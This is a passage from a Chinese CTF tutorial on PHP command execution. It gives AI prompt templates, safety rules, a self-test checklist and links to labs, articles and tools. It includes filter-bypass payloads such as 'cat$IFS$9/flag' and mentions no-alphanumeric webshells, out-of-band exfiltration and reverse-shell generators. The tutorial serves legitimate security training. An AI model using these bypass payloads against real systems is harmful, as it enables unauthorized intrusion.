| **解释器** | 贴一段 payload，让它逐字符拆解 | "逐字符解释 `cat$IFS$9/flag` 为什么等价于 `cat /flag`" |
| **出题人** | 让它写一个带过滤的靶场代码，你本地打 | "写一个 PHP 靶场，过滤空格和 `flag` 关键字，但保留可绕过的漏洞" |
| **陪练/复读机** | 让它给同一目标的 3 种不同解法、再给反制 | "针对这个过滤规则，再给我 3 种绕过思路，并说明各自的失败条件" |

**可复制的提问模板：**

```text
【角色】你是有 CTF 出题经验的 Web 安全讲师。
【背景】我在做命令执行靶场，源码是：<贴源码>
【现状】我发 ?cmd=cat${IFS}/flag，返回 WAF!；发 ?cmd=cat</flag 返回 200 但无输出。
【要求】1) 推断过滤规则；2) 给 3 种绕过思路并说明原理；
        3) 明确哪些方案依赖 bash、哪些依赖 PHP 版本；4) 不要直接给 flag。
```

```text
【任务】把我贴的这段 payload 拆成"编码层 / 语言层 / shell 层"三部分，
说明每一层发生了什么变换，并指出如果目标换成 alpine(ash) 或 PHP 8 会在哪一步失败。
<payload>
```

```text
【任务】给我一份在本地复现这个漏洞的最简环境：
1) 一个 vuln.php（只保留漏洞相关代码）；2) php -S 启动命令；
3) 3 条验证请求（一条正常、两条利用）；4) 用来验证的 flag 文件放哪。
```

### 11.2 三条铁律

!!! danger "铁律"
    1. **AI 生成的 payload 默认当作"过时且未验证"**。它的训练数据里大量是 PHP 5/7 时代的 writeup，直接抄到 PHP 8 上必然翻车。
    2. **任何 payload 必须在本地靶场跑通再用于比赛**。搭最小靶场只要 10 行代码（见 [3.1 方式 B](#setup)），这是你能给自己加的最高性价比的保险。
    3. **不要用 AI 去打真实目标**。授权范围之外的任何利用都是违法，AI 不会替你承担责任。

### 11.3 建议的学习闭环

```
遇到题 → 先自己判断"三层"（编码/语言/shell）
      → 卡住时用 AI 要"思路 + 失败条件"，不要答案
      → 在本地最小靶场复现同类代码，把 payload 跑通
      → 写进自己的博客/速查表（尤其是"我踩了什么坑"）
      → 下次遇到过滤更强的题，从自己的速查表出发
```

**要避免的三件事：**

- ❌ 直接让 AI 给 flag / 给完整 exp，然后复制粘贴交题 —— 你只是完成了提交动作，没有获得能力。
- ❌ 只读不敲 —— 命令执行的肌肉记忆来自靶场，不来自阅读。
- ❌ 遇到打不通就认为"AI 骗我" —— 多数情况是版本/环境差异，学会用第 10 节的表格自查。

## 12. 自测清单

能独立完成下面这些，说明你已经入门了：

- ⬜ 说清**代码执行**和**命令执行**的区别，并各举一个 PHP 函数
- ⬜ 不查资料写出 5 种命令分隔符，并说明 `||` 与 `;` 的差别
- ⬜ 用 `php -S` + 10 行代码在本地搭出可注入的靶场，并打出 `id`
- ⬜ 空格被过滤时，能给出至少 3 种绕过方式（并知道哪种只对 bash 生效）
- ⬜ `flag` 关键词被过滤时，能用通配符与引号拼接读到文件
- ⬜ 目标无回显时，能选择写文件 / 时间盲注 / 带外 三条路线中的合适一条
- ⬜ 能读懂无参 RCE 的正则含义，并用 `scandir`+`current(localeconv())` 列目录
- ⬜ 能解释「取反 payload」为什么不含字母数字也能执行命令
- ⬜ 目标 PHP 8 时，能说清哪些老技巧会失效、为什么
- ⬜ 用 AI 生成的 payload，你有在本地验证的习惯

## 13. 题单与资料

### 靶场

- [RCE-labs（ProbiusOfficial）](https://github.com/ProbiusOfficial/RCE-labs) —— 本页主要参考的靶场，28 关覆盖代码执行、命令执行、Bypass、PHP 特性、RCE 来源
- [Hello-CTF · RCE 章节](https://hello-ctf.com/hc-web/rce/) —— 系统化教材，配套 hc-labs
- [Hello-CTF · Docker 与漏洞环境](https://hello-ctf.com/hc-web/docker_env/) —— 不会搭环境先看这个
- NSSCTF / 青少年 CTF / CTF+ 搜索标签 `RCE-labs`（在线环境）

### 文章

- [RCE 总结 Re:Master（c1oudfl0w0）](https://c1oudfl0w0.github.io/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/) —— 本文另一主要参考，无回显、极限长度、`disable_functions` 部分尤其全
- [一些不包含数字和字母的 webshell（phith0n）](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
- [无字母数字 webshell 之提高篇（phith0n）](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
- [我是如何利用环境变量注入执行任意命令（phith0n）](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)
- [bashFuck：Bash 无字母数字命令执行](https://probiusofficial.github.io/bashFuck/)
- [PayloadsAllTheThings · Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

### 工具

- **Burp Suite / Yakit**：看原始请求与响应，定位被拦字符（**必备**）
- **dnslog / Burp Collaborator**：DNS、HTTP 带外
- **CyberChef**：编码、解码、异或、取反一站式（生成绕过 payload 很顺手）
- **在线反弹 shell 生成器**：省事用，但要理解原理（见 [7.4](#reverse-shell)）

!!! quote "最后"
    命令执行是 Web 方向里"反馈最直接"的漏洞：你在靶场敲下的每一个符号，系统都会立刻回应你。**把这份直觉练出来**，比背下任何一张 payload 表都值钱。

    顺便说一句：学习路上遇到问题，先自己复现一遍最小环境，再来群里提问——你会发现问题常常在复现的过程中自己就消失了。
